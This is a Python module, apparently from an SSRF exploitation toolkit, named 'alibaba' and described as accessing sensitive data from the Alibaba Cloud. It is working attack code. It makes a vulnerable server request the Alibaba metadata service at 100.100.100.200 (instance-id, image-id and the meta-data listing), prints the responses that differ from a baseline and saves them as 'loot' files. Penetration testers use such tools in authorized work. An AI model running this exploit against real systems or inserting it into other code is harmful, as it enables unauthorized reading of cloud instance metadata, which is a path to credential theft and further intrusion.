import logging

from core.utils import *

name = "alibaba"
description = "Access sensitive data from the Alibaba Cloud"
author = "Swissky"
documentation = [""]


class exploit:
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":
                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {payload}")
                    print(diff)

                    # Write diff to a file
                    filename = endpoint[1].split("/")[-1]
                    if filename == "":
                        filename = endpoint[1].split("/")[-2:-1][0]

                    output_path = loot_path(requester.host, filename)
                    logging.info(f"\033[32mWriting file\033[0m : {payload} to {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

    def add_endpoints(self):
        self.endpoints.add(("100.100.100.200", "latest/meta-data/instance-id"))
        self.endpoints.add(("100.100.100.200", "latest/meta-data/image-id"))
        self.endpoints.add(("100.100.100.200", "latest/meta-data/"))
